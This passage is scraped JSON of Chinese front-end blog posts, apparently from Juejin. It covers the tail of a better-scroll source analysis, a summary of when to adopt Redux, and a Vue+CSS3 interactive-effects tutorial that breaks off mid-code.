{\n    <span class=\"hljs-built_in\">let</span> left = 0\n    <span class=\"hljs-built_in\">let</span> top = 0\n\n    <span class=\"hljs-keyword\">while</span> (el) {\n        left -= el.offsetLeft\n        top -= el.offsetTop\n        el = el.offsetParent\n    }\n\n    <span class=\"hljs-built_in\">return</span> {\n        left,\n        top\n    }\n}</code></pre><p>一直找到没有父元素的时候，就找到元素距离document的距离了</p>\n<h1 class=\"heading\" data-id=\"heading-4\">3、trigger函数</h1><p>在better-scroll的源码中，多次用到trigger函数，我们来看看他都做了什么</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"> BScroll.prototype.trigger = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-built_in\">type</span>) {\n        <span class=\"hljs-built_in\">let</span> events = this._events[<span class=\"hljs-built_in\">type</span>]\n        <span class=\"hljs-keyword\">if</span> (!events) {\n            <span class=\"hljs-built_in\">return</span>\n        }\n\n        <span class=\"hljs-built_in\">let</span> len = events.length\n        <span class=\"hljs-built_in\">let</span> eventsCopy = [...events]\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> i = 0; i &lt; len; i++) {\n            <span class=\"hljs-built_in\">let</span> event = eventsCopy[i]\n            <span class=\"hljs-built_in\">let</span> [fn, context] = event\n            <span class=\"hljs-keyword\">if</span> (fn) {\n                fn.apply(context, [].slice.call(arguments,1))\n            }\n        }\n  }</code></pre><p>trigger函数的作用就是切换到某个事件中，获取到事件，然后使用fn进行调用。没什么太大难度，这里想到一点能够体现es6的优越性的地方，比如a = [1,2,3] 在es5中如果我们需要获取a这个数组长度的时候，我们需要这样写</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"> <span class=\"hljs-built_in\">let</span> len = a.length</code></pre><p>但是在es6中我们不再需要这样写了，这样写就行</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">let</span> { length } = a</code></pre><p>如果需要获取其他属性值，就麻瓜式往里边填。这里还涉及一个深拷贝的问题，数组和对象的深拷贝这里不做过多阐述。上述最重要的我认为就是这三个函数</p>\n<h2 class=\"heading\" data-id=\"heading-5\">总结：</h2><p>这个better-scroll的源码条理清晰，毕竟滴滴D8的段位摆在那儿，非常适合阅读。还有一些就是我对源码分析的文章的看法。在写这个源码分析的文章的时候，我意识到一个问题，那就是不仅我自己能够看懂，以前我也写过vuex的源码分析，基本就是把代码全部贴上去，写了大概2万字，我现在觉得这种方法欠妥，正确的方式应该就是把重要的部分提取出来，最重要的引导一个思路。把代码整个贴出来，显得繁琐不说，又相当于读者自己把注释看了一遍而已，所以我认为正确的方式是弄出一个思路，读者尝试读源码的时候，能够有一个大概的概念。能够自己理清思路<br>注释代码已经上传到<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fskychenbo%2FBlog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GitHub</a><br>至于为什么这个标题不写better-scroll的源码分析呢，我怕有些人说有些源码分析的文章就是垃圾，所以至少在字面上进行改变(逃。。。)</p>\n</div>"},{"title":"4 张动图解释为什么（什么时候）使用 Redux","avatar":"https://user-gold-cdn.xitu.io/2016/11/29/9353b74f1dd7cab2edb0d04a6d87d3b5?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"justjavac","create_time":"2017 年 11 月 24 日","tags":["React.js","Redux","前端","GitHub"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<p><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdev-reading%2Ffe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">dev-reading/fe</a> 是一个阅读、导读、速读的 repo，不要依赖于 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdev-reading%2Ffe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">dev-reading/fe</a> 学习知识。本 repo 只是一个快速了解文章内容的工具，并不提供全文解读和翻译。你可以通过本平台快速了解文章里面的内容，找到感兴趣的文章，然后去阅读全文。</p>\n</blockquote>\n<p>本文讨论地址：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdev-reading%2Ffe%2Fissues%2F11\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/dev-reading…</a></p>\n<p>阅读时间大概 1 分钟</p>\n<hr>\n<blockquote>\n<p>过早优化是万恶之源 —— Donald Knuth</p>\n</blockquote>\n<p>本文描述了<strong>什么时候</strong>开始使用 Redux。作者描述了在构建一个真实 React APP 时，从没有使用 Redux 到使用 Redux 的过程以及收获。</p>\n<p>首先，<strong>并不是所有的 React 应用程序都需要使用 Redux</strong>。事实上，大多数非常简单的 React 应用程序根本不能从 Redux 中受益。</p>\n<h2 class=\"heading\" data-id=\"heading-0\">第 1 天</h2><p>使用 React 本地组件状态</p>\n<p>React 使用<a href=\"https://link.juejin.im?target=https%3A%2F%2Freactjs.org%2Fdocs%2Fstate-and-lifecycle.html%23the-data-flows-down\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">单向数据流</a>，这意味着父组件把自身的状态作为属性传递给子组件。</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/24/15fec0f752bc65da?imageslim\" data-width=\"550\" data-height=\"300\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;550&quot; height=&quot;300&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-1\">第 5 天</h2><p>随着添加更多的功能，<strong>非父子</strong>组件之间需要<strong>共享</strong>一些状态。</p>\n<p>我们通过<a href=\"https://link.juejin.im?target=https%3A%2F%2Freactjs.org%2Fdocs%2Flifting-state-up.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">提升状态</a>来解决这个问题。</p>\n<p>这意味着我们将状态（和改变这个状态的函数）<strong>提升到最接近的祖先</strong>（Container Component）。我们将这些函数绑定到容器组件，并将它们作为属性向下传递。这意味着子组件可以触发其父组件中的状态更改，这将<strong>更新树中的所有其他组件</strong>。</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/24/15fec0fa567406fc?imageslim\" data-width=\"550\" data-height=\"325\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;550&quot; height=&quot;325&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-2\">第 20 天</h2><p>随着添加了更多的功能和组件，我们的应用程序状态流程开始看起来像这样...</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/24/15fec0fe0baebb20?imageslim\" data-width=\"550\" data-height=\"475\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;550&quot; height=&quot;475&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-3\">第 n 天</h2><p>如果您开始遇到上述某些问题，则可能意味着您应该使用 Redux 了。</p>\n<h2 class=\"heading\" data-id=\"heading-4\">Redux</h2><p>当我们使用 Redux 后，状态变成了这样：</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/24/15fec100e3242019?imageslim\" data-width=\"700\" data-height=\"475\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;700&quot; height=&quot;475&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>如果您的应用符合以下某些条件，那么我认为应该立即使用 Redux。</p>\n<ul>\n<li>UI 可以根据应用程序状态显着变化</li>\n<li>并不总是以一种线性的，单向的方式流动</li>\n<li>许多不相关的组件以相同的方式更新状态</li>\n<li>状态树并不简单</li>\n<li>状态以许多不同的方式更新</li>\n<li>您需要能够撤消以前的用户操作</li>\n</ul>\n<hr>\n<blockquote>\n<p>阅读原文：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fmedium.com%2Fdailyjs%2Fwhen-do-i-know-im-ready-for-redux-f34da253c85f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">When do I know I’m ready for Redux?</a></p>\n<p>讨论地址：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdev-reading%2Ffe%2Fissues%2F11\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">4 张动图解释为什么（什么时候）使用 Redux #11</a></p>\n<p>如果你想参与讨论，请<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdev-reading%2Ffe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">点击这里</a></p>\n</blockquote>\n</div>"},{"title":"也许 Vue+CSS3 做交互特效更简单","avatar":"https://user-gold-cdn.xitu.io/2017/7/18/64d82b70650d11ed806f611d929c7b1e?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"守候i","create_time":"2017 年 11 月 20 日","tags":["Vue.js","CSS","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 data-id=\"heading-0\">1.前言</h2><p>做项目就难免会开发交互效果或者特效，而我最近开发的项目一直在使用<code>vue</code>，开发技术栈方面，理所当然就使用了<code>vue</code>+<code>css3</code>开发，过程中发现使用<code>vue</code>+<code>css3</code>开发特效，和<code>javascript</code>/<code>jquery</code>+<code>css3</code>的思维方式不一样，但是比<code>javascript</code>/<code>jquery</code>+<code>css3</code>简单一点点。今天就分享三个简单的小实例，希望能起到拓展思维的作用，让大家明白vue+css3应该怎样开发交互效果！如果大家有什么好的建议，或者觉得我哪里写错了，欢迎指出！</p><blockquote><p>1.文章上面的代码，虽然代码很简单，不难理解，但是也是建议大家边写边看，这样不会混乱。<br>2.文章所提及的小实例，都是很基础的，大家可以参照自己的想法进行扩展，或者修改，可能会有意想不到的效果。我写这类型的文章也是想授人以渔，不是授人以鱼！<br>3.这几个实例，摘自我自己的平常练习的项目，代码已经提到github上面了(<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fdemos%2Ftree%2Fmaster%2Fvue-demos\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue-demos</a>)。欢迎大家star。</p></blockquote><h2 data-id=\"heading-1\">2.开场小动画</h2><h3 data-id=\"heading-2\">运行效果</h3><p>gif图模糊效果看着跟实际效果不太一样！大家注意！</p><p><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c6920ea81c9?imageslim\" data-width=\"800\" data-height=\"146\" src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c6920ea81c9?imageslim\"></p><h3 data-id=\"heading-3\">原理分析</h3><p>说到原理分析，其实也没什么可以分析的，就是在页面是下面这个状态的时候，把文字替换掉。至于看到字体缩成一团，就是<code>letter-spacing</code>这个<code>css</code>属性的控制效果。字体模糊就是<code>filter: blur()</code>这个<code>css</code>属性的控制效果！看到有逐渐的变化，就是css3动画（<code>animation</code>）的效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c691876a3ee?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"144\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;144&quot;&gt;&lt;/svg&gt;\"></p><p>下面简单分析下，这个动画的几个步骤，从下面看到，这个动画一共8个步骤。</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c694a4e7487?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"440\" data-height=\"704\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;440&quot; height=&quot;704&quot;&gt;&lt;/svg&gt;\"></p><p>这下就清晰明了了，我们要在下图这个瞬间开始改变文字，也就是页面加载了两秒后，动画执行了两次后就开始改变文字。然后每隔两秒改变一次文字，直到最后！</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c691b1f4869?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"426\" data-height=\"91\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;426&quot; height=&quot;91&quot;&gt;&lt;/svg&gt;\"></p><p>下面给出<code>vue</code>和<code>javascript</code>两种方式的代码，看下哪种方式更加的简单！</p><h3 data-id=\"heading-4\">vue方式</h3><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;style&gt;\n    body{\n        background: <span class=\"hljs-comment\">#ccc;</span>\n    }\n    h1 {\n        color: white;\n        text-transform: uppercase;\n        margin-top: 100px;\n        text-align: center;\n        font-size: 6rem;\n        line-height: 1;\n        animation: letterspacing 1s 7 alternate ease-in-out;\n        display: block;\n        letter-spacing: .5rem;\n    }\n\n    @keyframes letterspacing {\n        0% {\n            letter-spacing: -72px;\n            filter: blur(20px);\n        }\n\n        40% {\n            filter: blur(6px);\n        }\n\n        80% {\n            letter-spacing: 8px;\n            filter: blur(0);\n        }\n    }\n&lt;/style&gt;\n&lt;body&gt;\n&lt;div id=<span class=\"hljs-string\">\"text\"</span>&gt;\n    &lt;h1&gt;{{<span class=\"hljs-built_in\">test</span>Text}}&lt;/h1&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;script src=<span class=\"hljs-string\">\"vue.min.js\"</span>&gt;&lt;/script&gt;\n&lt;script <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/javascript\"</span>&gt;\n    new Vue({\n        el:<span class=\"hljs-string\">'#text'</span>,\n        data:{\n            nowIndex:0,\n            <span class=\"hljs-built_in\">test</span>Text:<span class=\"hljs-string\">'欢迎浏览'</span>\n        },\n        <span class=\"hljs-function\"><span class=\"hljs-title\">mounted</span></span>(){\n            <span class=\"hljs-built_in\">let</span> _this=this;\n            <span class=\"hljs-built_in\">let</span> timer = <span class=\"hljs-built_in\">set</span>Interval(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){\n                _this.nowIndex++;\n                switch (_this.nowIndex) {\n                    <span class=\"hljs-keyword\">case</span> 1:\n                        _this.testText = <span class=\"hljs-string\">'守候的文章'</span>;\n                        <span class=\"hljs-built_in\">break</span>;\n                    <span class=\"hljs-keyword\">case</span> 2:\n                        _this.testText = <span class=\"hljs-string\">'愿您浏览愉快'</span>;\n                        <span class=\"hljs-built_in\">break</span>;\n                    <span class=\"hljs-keyword\">case</span> 3:\n                        _this.testText = <span class=\"hljs-string\">'学到知识'</span>;\n                        <span class=\"hljs-built_in\">break</span>;\n                }\n                <span class=\"hljs-keyword\">if</span> (_this.nowIndex &gt; 3) {\n                    <span class=\"hljs-built_in\">set</span>Timeout(() =&gt; {\n                        clearInterval(timer);\n                    }, 2000)\n                }\n            }, 2000)\n        }\n    })\n&lt;/script&gt;\n&lt;/html&gt;</code></pre><h3 data-id=\"heading-5\">javascript方式</h3><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;style&gt;\n    body{\n        background: <span class=\"hljs-comment\">#ccc;</span>\n    }\n    h1 {\n        color: white;\n        text-transform: uppercase;\n        margin-top: 100px;\n        text-align: center;\n        font-size: 6rem;\n        line-height: 1;\n        animation: letterspacing 1s 7 alternate ease-in-out;\n        display: block;\n        letter-spacing: .5rem;\n    }\n\n    @keyframes letterspacing {\n        0% {\n            letter-spacing: -6rem;\n            filter: blur(1rem);\n        }\n\n        40% {\n            filter: blur(.3rem);\n        }\n\n        80% {\n            letter-spacing: .5rem;\n            filter: blur(0rem);\n        }\n    }\n&lt;/style&gt;\n&lt;body&gt;\n&lt;div id=<span class=\"hljs-string\">\"text\"</span>&gt;\n    &lt;h1&gt;欢迎浏览&lt;/h1&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;script&gt;\n    var oH1=document.querySelector(<span class=\"hljs-string\">'h1'</span>),nowIndex=0;\n    console.log(oH1)\n    var timer = <span class=\"hljs-built_in\">set</span>Interval(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        nowIndex++;\n        switch (nowIndex) {\n            <span class=\"hljs-keyword\">case</span> 1:\n                oH1.innerHTML = <span class=\"hljs-string\">'守候的文章'</span>;\n                <span class=\"hljs-built_in\">break</span>;\n            <span class=\"hljs-keyword\">case</span> 2:\n                oH1.innerHTML = <span class=\"hljs-string\">'愿您浏览愉快'</span>;\n                <span class=\"hljs-built_in\">break</span>;\n            <span class=\"hljs-keyword\">case</span> 3:\n                oH1.innerHTML = <span class=\"hljs-string\">'学到知识'</span>;\n                <span class=\"hljs-built_in\">break</span>;\n        }\n        <span class=\"hljs-keyword\">if</span> (nowIndex &gt; 3) {\n            <span class=\"hljs-built_in\">set</span>Timeout(() =&gt; {\n                clearInterval(timer);\n            }, 2000)\n        }\n    }, 2000)\n&lt;/script&gt;\n&lt;/html&gt;</code></pre><h2 data-id=\"heading-6\">3.导航滑块</h2><h3 data-id=\"heading-7\">运行效果</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c695c255d9c?imageslim\" data-width=\"800\" data-height=\"126\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;126&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-8\">原理分析</h3><p>首先，下面是页面初始化的时候，橙色滑块的位置</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c694813ca84?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"691\" data-height=\"46\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;691&quot; height=&quot;46&quot;&gt;&lt;/svg&gt;\"></p><p>鼠标放到第二个tab上面，大家可以看到，橙色滑块就是向右偏移了一个tab的距离</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c69ac27319b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"650\" data-height=\"68\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;650&quot; height=&quot;68&quot;&gt;&lt;/svg&gt;\"></p><p>鼠标放到第三个tab上面，大家可以看到，橙色滑块就是向右偏移了两个tab的距离</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c69e2ea91a4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"652\" data-height=\"113\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;652&quot; height=&quot;113&quot;&gt;&lt;/svg&gt;\"></p><p>如果从第一个tab到第六个tab的索引是0,1,2,3,4,5。</p><p>那么滑块的公式就是（索引*tab的宽度）。大家看到有逐渐过去的效果，其实是css3过渡（<code>transition</code>）的效果。大家看下面的代码就行了，一看就懂！代码如下：</p><h3 data-id=\"heading-9\">vue方式</h3><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;link rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"reset.css\"</span>&gt;\n&lt;style&gt;\n    .nav{\n        margin: 40px;\n        position: relative;\n    }\n.nav li{\n    <span class=\"hljs-built_in\">float</span>: left;\n    width: 100px;\n    height: 40px;\n    line-height: 40px;\n    color: <span class=\"hljs-comment\">#fff;</span>\n    text-align: center;\n    background: <span class=\"hljs-comment\">#09f;</span>\n    cursor: pointer;\n}\n    .nav span{\n        position: relative;\n        z-index: 2;\n    }\n    .nav .slider{\n        position: absolute;\n        transition: all .5s cubic-bezier(0.4, -0.3, 0.57, 1.38);\n        width: 100px;\n        height: 40px;\n        background: <span class=\"hljs-comment\">#f90;</span>\n        top: 0;\n        left: 0;\n        z-index: 1;\n    }\n&lt;/style&gt;\n&lt;body&gt;\n&lt;div class=<span class=\"hljs-string\">\"nav clear\"</span> id=<span class=\"hljs-string\">\"nav\"</span> @mouseleave=<span class=\"hljs-string\">\"nowIndex=0\"</span>&gt;\n    &lt;ul&gt;\n        &lt;li @mouseenter.stop=<span class=\"hljs-string\">\"nowIndex=0\"</span>&gt;&lt;span&gt;Tab One&lt;/span&gt;&lt;/li&gt;\n        &lt;li @mouseenter.stop=<span class=\"hljs-string\">\"nowIndex=1\"</span>&gt;&lt;span&gt;Tab Two&lt;/span&gt;&lt;/li&gt;\n        &lt;li @mouseenter.stop=<span class=\"hljs-string\">\"nowIndex=2\"</span>&gt;&lt;span&gt;Tab Three&lt;/span&gt;&lt;/li&gt;\n        &lt;li @mouseenter.stop=<span class=\"hljs-string\">\"nowIndex=3\"</span>&gt;&lt;span&gt;Tab four&lt;/span&gt;&lt;/li&gt;\n        &lt;li @mouseenter.stop=<span class=\"hljs-string\">\"nowIndex=4\"</span>&gt;&lt;span&gt;Tab five&lt;/span&gt;&lt;/li&gt;\n        &lt;li @mouseenter.stop=<span class=\"hljs-string\">\"nowIndex=5\"</span>&gt;&lt;span&gt;Tab six&lt;/span&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;div class=<span class=\"hljs-string\">\"slider\"</span> :style=<span class=\"hljs-string\">\"{'transform':'translate3d('+nowIndex*100+'px,0,0)'}\"</span>&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;script src=<span class=\"hljs-string\">\"vue.min.js\"</span>&gt;&lt;/script&gt;\n&lt;script <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/javascript\"</span>&gt;\n   new Vue({\n       el:<span class=\"hljs-string\">'#nav'</span>,\n       data:{\n           nowIndex:0\n       }\n   })\n&lt;/script&gt;\n&lt;/html&gt;</code></pre><h3 data-id=\"heading-10\">javascript方式</h3><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;link rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"reset.css\"</span>&gt;\n&lt;style&gt;\n    .nav{\n        position: relative;\n    }\n.nav li{\n    <span class=\"hljs-built_in\">float</span>: left;\n    width: 100px;\n    height: 40px;\n    line-height: 40px;\n    color: <span class=\"hljs-comment\">#fff;</span>\n    text-align: center;\n    background: <span class=\"hljs-comment\">#09f;</span>\n    cursor: pointer;\n}\n    .nav span{\n        position: relative;\n        z-index: 2;\n    }\n    .nav .slider{\n        position: absolute;\n        transition: all .5s cubic-bezier(0.4, -0.3, 0.57, 1.38);\n        width: 100px;\n        height: 40px;\n        background: <span class=\"hljs-comment\">#f90;</span>\n        top: 0;\n        left: 0;\n        z-index: 1;\n    }\n&lt;/style&gt;\n&lt;body&gt;\n&lt;div class=<span class=\"hljs-string\">\"nav clear\"</span> id=<span class=\"hljs-string\">\"nav\"</span>&gt;\n    &lt;ul&gt;\n        &lt;li&gt;&lt;span&gt;Tab One&lt;/span&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;span&gt;Tab Two&lt;/span&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;span&gt;Tab Three&lt;/span&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;span&gt;Tab four&lt;/span&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;span&gt;Tab five&lt;/span&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;span&gt;Tab six&lt;/span&gt;&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;div class=<span class=\"hljs-string\">\"slider\"</span>&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;script <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/javascript\"</span>&gt;\n    var oDiv=document.querySelector(<span class=\"hljs-string\">\"#nav\"</span>),oLi=oDiv.querySelectorAll(<span class=\"hljs-string\">\"li\"</span>),oSlider=document.querySelector(<span class=\"hljs-string\">\".slider\"</span>);\n    oDiv.addEventListener(<span class=\"hljs-string\">\"mouseleave\"</span>,<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        oSlider.style.transform=<span class=\"hljs-string\">'translate3d(0,0,0)'</span>;\n    })\n    <span class=\"hljs-keyword\">for</span>(var i=0;i&lt;oLi.length;i++){\n        oLi[i].index=i;\n        oLi[i].addEventListener(<span class=\"hljs-string\">\"mouseenter\"</span>,<span class=\"hljs-keyword\">function</span> (e) {\n            oSlider.style.transform=<span class=\"hljs-string\">'translate3d('</span>+this.index*100+<span class=\"hljs-string\">'px,0,0)'</span>;\n        })\n    }\n&lt;/script&gt;\n&lt;/html&gt;</code></pre><h2 data-id=\"heading-11\">4.轮播图</h2><h3 data-id=\"heading-12\">运行效果</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c6a09676e46?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"402\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;402&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-13\">原理分析</h3><p>蓝框的是li，黑框的是div</p><p>初始化状态</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c69eedc657e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"177\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;177&quot;&gt;&lt;/svg&gt;\"></p><p>处于显示第二张图片的时候</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/20/15fd6c69c722f686?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"230\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;230&quot;&gt;&lt;/svg&gt;\"></p><p>看到上面，其实也就是控制ul的偏移量（<code>transform:translate3d</code>）。计算公式和上面的滑块相似，索引（<code>0|1|2|3</code>）*<code>li</code>的宽度。不同的就是，ul的偏移量是取负数，因为ul是想左偏，上面的滑块是向右偏！<br>当第一张图片的时候，ul偏移量设置（<code>transform: translate3d(0px, 0px, 0px)</code>）。<br>当第二张图片的时候，ul偏移量设置（<code>transform: translate3d(-1000px, 0px, 0px)</code>）。<br>当第二张图片的时候，ul偏移量设置（<code>transform: translate3d(-2000px, 0px, 0px)</code>）。以此类推，偏移量很简单的就能计算出来！</p><p>可能我说的大家有点懵，但是，看下面的代码，就不会懵了，因为代码也很简单！</p><h3 data-id=\"heading-14\">vue方式</h3><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n    &lt;link rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"reset.css\"</span>&gt;\n    &lt;style&gt;\n        .slide-img {\n            width: 1000px;\n            